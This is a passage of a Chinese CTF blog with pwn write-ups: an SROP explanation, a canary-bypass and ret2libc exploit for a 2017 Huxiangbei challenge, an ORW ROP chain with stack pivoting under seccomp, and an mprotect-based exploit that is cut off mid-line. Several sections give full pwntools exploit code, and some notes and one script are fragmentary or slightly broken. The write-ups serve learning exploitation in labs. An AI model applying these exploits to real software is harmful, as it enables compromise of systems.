-<p>SROP利用了Linux系统信号处理过程中的漏洞：在信号处理过程中会将用户态上下文环境及寄存器的值保存在用户态的栈中，处理完后再读取栈中的数据恢复寄存器的值。其中“处理完后再读取栈中的数据恢复寄存器中的值”就是 sigreturn 系统调用的作用，它会读取当前栈空间中的数据并传给相应寄存器。</p>
-<p>sigreturn 系统调用会改变所有寄存器的值，包括RSP/ESP与RBP/EBP的值，所以虽然可以利用SROP来实现任何想要的系统调用，但是同时其会改变栈顶指针，有时候这不是我们想要的。</p>
-<p>综上，SROP的攻击思路就是利用栈溢出设置返回地址为 sigreturn 系统调用的gadget，然后在栈上布置对应寄存器的数据，待 sigreturn 系统调用结束，所以寄存器的值都会变成我们布置在栈上的值。</p>
-<p>完成一次 SROP 攻击需要具备四个条件：</p>
-<ol>
-<li>存在栈溢出漏洞，使得栈上的数据可控</li>
-<li>需要知道 ‘/bin/sh’ 的地址，如果是自己构造在栈上的，那就需要知道栈的地址</li>
-<li>需要知道 syscall 指令在内存中的地址</li>
-<li>需要知道 sigreturn 系统调用的内存地址（这个单独的gadget并不是必须的，因为 sigreturn 也是一个系统调用，只要令 <code>rax = 15</code> 或 <code>eax = 77 </code> ，然后再调用 syscall 指令，就相当于调用了 sigreturn ）</li>
-</ol>
-<h3 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h3><p>整个程序的代码段只有如下部分</p>
-<img src="/2021/12/06/SROP/assembly.jpg" class>
-
-<p>反汇编如下</p>
-<img src="/2021/12/06/SROP/start.jpg" class>
-
-<p>从汇编代码来看，程序只是做了将相应的寄存器赋值的工作，然后就执行 <code>syscall_ret</code> 了，其中从 <code>mov rsi,rsp</code> 可知 read() 在栈顶处写入内容，结合汇编代码可知 <code>ret</code> 返回的地址也是栈顶中的内容，所以我们输入的前八个字节可以控制返回地址。</p>
-<p>因为程序只有这么些代码，显然需要我们手动构造系统调用来getshell，显然因为我们能利用的汇编段有限，所以大部分寄存器的值都无法直接被我们修改，所以这时我们可以利用 SROP 来将我们想修改的寄存器修改为对应值，而要调用 sigreturn 则需要 rax = 15 ，也就是系统调用号 = 15，那么怎么控制 rax 的值？我们需要知道read() 的返回值存放在 rax 中，而 read() 的返回值就是其读取的字节数，那么我们就可以通过控制输入的字节数来控制 rax 寄存器进而调用 sigreturn 。</p>
-<p>因为我们最终需要通过 SROP 来调用 <code>execve(&quot;/bin/sh&quot;,0,0)</code> ，所以我们还需要泄漏栈上的地址，否则无法计算出 “/bin/sh” 所在的地址。所以我们需要先调用一个输出函数，延续上述思路，我们通过控制输入的字节数来控制 rax ，同时在本题中合适的输出函数似乎只有 write() ，而 write() 的系统调用号为 1 ，我们需要做到：①只输入一个字节的同时控制返回地址。②write() 函数调用完后的返回地址也需要控制。</p>
-<p>那么怎么实现呢？我们可以在第一次输入时就将返回地址写入栈上，我们输入三个 <code>p64(0x4000B0)</code> ，第一个用来控制这次调用的返回，然后我们在第二次输入时输入 ‘\xb3’ 来将第一次输入时写入栈上的 ‘0x4000B0’ 的低字节的 ‘\xb0’ 覆盖掉，这样就控制了第二次的返回地址为 ‘0x4000B3’ ，返回到 ‘0x4000B3’ 是为了跳过 ‘0x4000B0’ 处的 <code>xor rax, rax</code> ，否则 rax 就被置0了。第二次返回之后就会调用 <code>write(1,&#39;rsp&#39;,0x400)</code> ，输出位于栈上的 0x400 个字节的数据，这其中肯定有栈上的地址，这样就完成了泄漏的工作，同时我们第一次输入时的第三个 ‘0x4000B0’ 控制了 write() 的返回，此后程序就会再调用一次 read() ，我们就可以继续后面的操作。</p>
-<p>read函数输入15个字节后返回到 b3 ，== 调用 sigreturn，后面要接 sigfram</p>
-<p>sigfram 和 ‘/bin/sh’ 一起send，这次在15字节之前send，所以要两次read</p>
-<p>现在这次send sig和bin ，</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/" class="post-title-link" itemprop="url">2017湖湘杯-pwn100</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-05 20:06:09" itemprop="dateCreated datePublished" datetime="2021-12-05T20:06:09+08:00">2021-12-05</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-07 10:27:08" itemprop="dateModified" datetime="2021-12-07T10:27:08+08:00">2021-12-07</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h4 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h4><p>Canary绕过，base64，代码审计</p>
-<p>需要对base64有基本的了解：base64会把每三个字节变成四个字节，也就是理论上原文经过base64编码后会长 1/3 ，密文解码后会短 1/4 。</p>
-<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>程序保护如下：</p>
-<img src="/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/checksec.png" class>
-
-<p>main()函数如下：</p>
-<img src="/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/main.jpg" class>
-
-<p>可以看到我们需要先输入一个”Y”防止退出，然后程序会fork出一个子进程，并将 fork() 的返回值赋给v2，因为在子进程中fork()的返回值为0，所以子进程会进入 sub_8048B29() 这个函数中，父进程则不会。我们跟进 sub_8048B29() 中</p>
-<img src="/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/sub_8048B29().png" class>
-
-<p>继续跟进</p>
-<img src="/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/sub_80487E6()-1.jpg" class>
-
-<img src="/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/sub_80487E6()-2.jpg" class>
-
-<img src="/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/sub_80487E6()-3.jpg" class>
-
-<p>可以看到这个函数里的算法比较复杂，暂时不明白用途，但是可以看到有几个关键点：①这个函数里设置了canary。②这个函数里malloc了 0x201 (513) 个字节的长度的内存并用dest指向它。③调用了sub_80486FD() 这个函数并将dest作为参数。④该函数最后的输出是v21（长度为 257 个字节的数组）</p>
-<p>分析到这里我们再跟进到 sub_80486FD() 中：</p>
-<img src="/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/sub_80486FD().jpg" class>
-
-<p>这个函数中的算法就比较简单，我们分析它的用途得知：①我们的输入需要符合 base64 编码。②我们的输入最后传给了dest。③我们的输入最多为 0x200 个字节。</p>
-<p>同时我们在上一个函数中的分析中可知最后输出的是v21，那么我们合理猜测sub_80487E6()的作用就是将我们输入的base64进行解码最后传给v21输出，我们跑一遍程序验证一下：</p>
-<img src="/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/program.jpg" class>
-
-<p>验证成功（我们输入的是base64编码后的 “hello” )，说明sub_80486FD()的作用跟我们的猜想一致。同时暴露了一个问题：我们的输入最多为 0x200，也就是 512 个字节，进过base64解码后会比原来短3/4 ，也就是 384 个字节，显然长于 v21 的 257 个字节，存在栈溢出。</p>
-<p>到此我们就知道可以通过栈溢出来getshell，所以我们还需要先泄漏出Canary。这里有两种方法：①因为进入 sub_80487E6() 的是子进程，所以我们可以通过爆破的方式得到Canary。②因为 sub_80487E6() 的printf() 会以字符串的形式输出 v21 ，所以我们可以通过覆盖掉Canary低字节的’\x00’来使Canary被连带打印出来。</p>
-<p>我们分别用两种方法来泄漏Canary：</p>
-<h5 id="覆盖’-x00’"><a href="#覆盖’-x00’" class="headerlink" title="覆盖’\x00’"></a>覆盖’\x00’</h5><p>计算padding的长度：</p>
-<img src="/2021/12/05/2017%E6%B9%96%E6%B9%98%E6%9D%AF-pwn100/stack.jpg" class>
-
-<p>v21到Canary的距离为：0x10D - 0xc = 0x101（257）个字节。加上覆盖的那一位共需要 258 个字节，所以我们将 258 个字节的padding以base64编码后发送（编码后实际发送的是344个字节）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">padding = base64.b64encode(&quot;a&quot;*258) </span><br><span class="line">p.send(padding)</span><br></pre></td></tr></table></figure>
-
-<p>接收Canary</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&quot;a&quot;*258)</span><br><span class="line">Canary = u32(p.recv(3).rjust(4,&#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>
-
-<p>到此我们成功泄漏出Canary</p>
-<h5 id="爆破Canary"><a href="#爆破Canary" class="headerlink" title="爆破Canary"></a>爆破Canary</h5><p>32位程序的Canary共有四位，除去一字节’\x00’，共需爆破三位，如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]&#x27;</span>)</span><br><span class="line">Canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;datas:\n&quot;</span>,base64.b64encode(<span class="string">&#x27;a&#x27;</span>*<span class="number">257</span> + Canary + <span class="built_in">chr</span>(j)))</span><br><span class="line">        recv = p.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Finish!&#x27;</span> <span class="keyword">in</span> recv:</span><br><span class="line">            Canary += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span>            </span><br></pre></td></tr></table></figure>
-
-<p>到此完成Canary的爆破</p>
-<h5 id="剩下部分"><a href="#剩下部分" class="headerlink" title="剩下部分"></a>剩下部分</h5><p>由以上方法得到Canary后就是常规的 ret2libc 了，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwns&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwns&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;May be I can know if you give me some data[Y/N]&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">        p.sendline(<span class="string">&quot;Y&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">&quot;datas:\n&quot;</span>,base64.b64encode(<span class="string">&#x27;a&#x27;</span>*<span class="number">257</span> + canary + <span class="built_in">chr</span>(j)))</span><br><span class="line">        recv = p.recvuntil(<span class="string">&#x27;some data[Y/N]&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Finish!&#x27;</span> <span class="keyword">in</span> recv:</span><br><span class="line">            canary += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;canary =&gt;&#x27;</span> + canary.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">257</span>+ canary +<span class="string">&#x27;a&#x27;</span>*<span class="number">12</span>+flat(elf.plt[<span class="string">&#x27;puts&#x27;</span>],<span class="number">0x8048B36</span>,elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Give me some datas:\n\n&#x27;</span>)</span><br><span class="line">p.send(base64.b64encode(payload1))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">257</span> + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">0xc</span> + flat(sys,<span class="number">1</span>,binsh)</span><br><span class="line">p.sendline(<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;datas:\n\n&quot;</span>,base64.b64encode(payload2))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/02/ORW/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/02/ORW/" class="post-title-link" itemprop="url">ORW</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-02 12:07:19" itemprop="dateCreated datePublished" datetime="2021-12-02T12:07:19+08:00">2021-12-02</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-16 15:21:06" itemprop="dateModified" datetime="2021-12-16T15:21:06+08:00">2021-12-16</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><h4 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h4><p>seccomp是linux内核中的一种沙箱机制，其可以限制进程对系统调用的访问，从系统调用号到系统调用的参数都可以进行检查和限制。正常情况下，程序可以使用所有的syscall，但是在开启seccomp后，我们就无法调用那些被禁止的syscall了。</p>
-<p>可以用 seccomp-tools 来检查程序的沙箱机制，如下：</p>
-<img src="/2021/12/02/ORW/seccomp.png" class>
-
-<p>当程序启用了 seccomp 禁用了 exeve() 时，我们便无法通过调用 system() 来getshell（system实际上也是调用了execve来实现的），这时我们就需要使用ORW（open、read、write）来将flag打印出来。</p>
-<p>简单地说，我们需要构造如下调用函数的rop链：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = open(&#x27;flag&#x27;,&#x27;r&#x27;)</span><br><span class="line">read(fd,buf,len)</span><br><span class="line">write(1,buf,len)</span><br></pre></td></tr></table></figure>
-
-<p>关于open()：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">功能：</span><br><span class="line">打开和创建文件（建立一个文件描述符，其他的函数可以通过文件描述符对指定文件进行读取与写入的操作。）</span><br><span class="line"></span><br><span class="line">原型：</span><br><span class="line">int open(const char*pathname,int flags);</span><br><span class="line">int open(const char*pathname,int flags,mode_t mode);</span><br><span class="line">参数说明：</span><br><span class="line">1.pathname</span><br><span class="line">  要打开或创建的目标文件</span><br><span class="line">2.flags</span><br><span class="line">  打开文件时，可以传入多个参数选项，用下面的</span><br><span class="line">  一个或者多个常量进行“或”运算，构成falgs</span><br><span class="line">  参数：</span><br><span class="line">  O_RDONLY:   只读打开</span><br><span class="line">  O_WRONLY:   只写打开</span><br><span class="line">  O_RDWR:     读，写打开</span><br><span class="line">这三个常量，必须制定一个且只能指定一个</span><br><span class="line">  O_CREAT:    若文件不存在，则创建它，需要使</span><br><span class="line">              用mode选项。来指明新文件的访问权限</span><br><span class="line">  O_APPEND:   追加写，如果文件已经有内容，这次打开文件所</span><br><span class="line">              写的数据附加到文件的末尾而不覆盖原来的内容</span><br><span class="line"></span><br><span class="line">ps：open函数具体使用那个，和具体应用场景相关，如目标文件存在，使用两个参数的open，如果目标文件不存在，需要open创建，则第三个参数表示创建文件的默认权限</span><br><span class="line"></span><br><span class="line">返回值：</span><br><span class="line">成功：新打开的文件描述符</span><br><span class="line">失败：-1</span><br><span class="line">open返回的文件描述符一定是最小的而且没有被使用的</span><br></pre></td></tr></table></figure>
-
-<h4 id="一道例题"><a href="#一道例题" class="headerlink" title="一道例题"></a>一道例题</h4><p>程序保护如下：</p>
-<img src="/2021/12/02/ORW/checksec.jpg" class>
-
-<p>程序主逻辑如下：</p>
-<img src="/2021/12/02/ORW/main.jpg" class>
-
-<p>程序利用seccomp开启了沙箱保护，如下：</p>
-<img src="/2021/12/02/ORW/init.png" class>
-
-<img src="/2021/12/02/ORW/seccomp.png" class>
-
-<p>分析：</p>
-<p>因为沙箱将 execve() 禁用了，所以我们不能通过正常方法getshell，可以看到我们的第一次输入可以在.bss段中输入 0x100 个字节的内容，且第三个 read() 存在 0x10 个字节的栈溢出，所以我们可以先将ORW的rop链写入到.bss段中，然后利用栈迁移将栈迁移到我们写rop链的地方执行即可打印出flag。</p>
-<p>我们结合exp来解释，如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&#x27;./ROP&#x27;)</span><br><span class="line">elf </span><br><span class="line"></span><br><span class="line">leave_ret=0x40090d</span><br><span class="line">pop_rdi_ret=0x400a43</span><br><span class="line">flag_addr=0x601170</span><br><span class="line">pop_rsi_r15_ret=0x400a41</span><br><span class="line"></span><br><span class="line">#bss_start = 0x6010A0</span><br><span class="line">payload=p64(0x06010A0+0x100)+p64(pop_rdi_ret)+p64(0x06010A0+0x80)+p64(pop_rsi_r15_ret)+p64(0)+p64(0)+p64(elf.plt[&quot;open&quot;])</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(4)+p64(pop_rsi_r15_ret)+p64(flag_addr)+p64(0)+p64(elf.plt[&#x27;read&#x27;])</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(flag_addr)+p64(elf.plt[&#x27;puts&#x27;])+p64(u64(&quot;flag&quot;.ljust(8,&quot;\x00&quot;)))</span><br><span class="line">print &quot;payloadlen=&gt;&quot;,hex(len(payload))</span><br><span class="line">p.sendlineafter(&quot;think so?\n&quot;,payload)</span><br><span class="line"></span><br><span class="line">payload=&quot;A&quot;*80+p64(0x06010A0)+p64(leave_ret)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>第一步我们构造的ORW链在.bss段中如下图：</p>
-<img src="/2021/12/02/ORW/ORW.jpg" class>
-
-<p>因为在栈迁移的过程中leave指令要pop ebp，所以我们需要放入一个抬ebp的地址在rop链中，剩下的构造便是我们分别调用了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">open(&#x27;flag&#x27;,0)</span><br><span class="line">read(4,flag_addr,?)</span><br><span class="line">puts(flag_addr)</span><br></pre></td></tr></table></figure>
-
-<p>这三个函数来将flag文件中的内容打印出来</p>
-<p>①payload中 open() 的第一个参数为 bss+0x80 处，是我们payload中的’flag’字符串的地址，需要计算payload的长度得出，</p>
-<p>②关于文件描述符，我们知道正常情况下0、1、2三个文件描述符都被占用且对应标准输入，标准输出，标准错误。且open()函数创建的文件描述符一定是最小且未被占用的，我们可以看到 main() 中有利用 open() 函数打开 “some_life_experience”的操作，所以如果远端的对应目录下存在该文件的话，文件描述符3将被程序创建。所以我们构造的ORW中的 open() 创建的文件描述符应该是4，这就是 read() 第一个参数是4的原因。（用该exp在本地打的话，因为我们的本地没有 “some_life_experience” 这个文件，所以文件描述符3不会被创建，所以在本地打的话 read() 第一个参数应该改为3，或者手动创建一个 “some_life_experience” 文件）</p>
-<p>③read() 的第二个参数 flag_addr 由我们任意选择，只要保证能读进去且不破坏程序执行即可。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2021/12/01/%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/12/01/%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/" class="post-title-link" itemprop="url">使用mprotect提升权限</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-12-01 21:37:41" itemprop="dateCreated datePublished" datetime="2021-12-01T21:37:41+08:00">2021-12-01</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-02 11:03:38" itemprop="dateModified" datetime="2021-12-02T11:03:38+08:00">2021-12-02</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="使用mprotect提升权限"><a href="#使用mprotect提升权限" class="headerlink" title="使用mprotect提升权限"></a>使用mprotect提升权限</h2><p>简单地说 mprotect() 可以修改调用进程内存页的保护属性，将起始地址为 addr ，长度为 len 的页的属性修改为 prot 指定的值。（addr必须是页的起始地址，len必须是该页的长度）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">int mprotect(void *addr, size_t len, int prot);</span><br><span class="line">addr：修改保护属性区域的起始地址，addr必须是一个内存页的起始地址，简而言之为页大小（一般是 4KB == 4096字节）整数倍。</span><br><span class="line">len：被修改保护属性区域的长度,最好为页大小整数倍。修改区域范围[addr, addr+len-1]。</span><br><span class="line">prot：可以取以下几个值，并可以用“|”将几个属性结合起来使用：</span><br><span class="line">1）PROT_READ：内存段可读；</span><br><span class="line">2）PROT_WRITE：内存段可写；</span><br><span class="line">3）PROT_EXEC：内存段可执行；</span><br><span class="line">4）PROT_NONE：内存段不可访问。</span><br><span class="line">返回值：0；成功，-1；失败（并且errno被设置）</span><br><span class="line">1）EACCES：无法设置内存段的保护属性。当通过 mmap(2) 映射一个文件为只读权限时，接着使用 mprotect() 标志为 PROT_WRITE这种情况就会发生。</span><br><span class="line">2）EINVAL：addr不是有效指针，或者不是系统页大小的倍数。</span><br><span class="line">3）ENOMEM：内核内部的结构体无法分配。</span><br></pre></td></tr></table></figure>
-
-<h4 id="一道简单的例题"><a href="#一道简单的例题" class="headerlink" title="一道简单的例题"></a>一道简单的例题</h4><p>保护如下：</p>
-<img src="/2021/12/01/%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/checksec.jpg" class>
-
-<p>main函数如下：</p>
-<img src="/2021/12/01/%E4%BD%BF%E7%94%A8mprotect%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/main.png" class>
-
-<p>此题为静态链接的文件，且包含了 mprotect() 函数，所以我们只需要利用 mprotect() 来修改一块内存页的权限为RWX后再将shellcode写入最后跳转到此处执行即可。</p>
-<p>exp如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">p = process(&quot;./not_&quot;)</span><br><span class="line"></span><br><span class="line">gets = 0x804F8D0</span><br><span class="line">addr = 0x80EB000</span><br><span class="line">mprotect = 0x806ED40</span><br><span class="line">pop3_ret=0x0804f420</span><br><span class="line"></span><br><span class="line">payload = &#x27;a&#x27;*0x2D + p32(mprotect) + p32(pop3_ret) + p32(addr) + 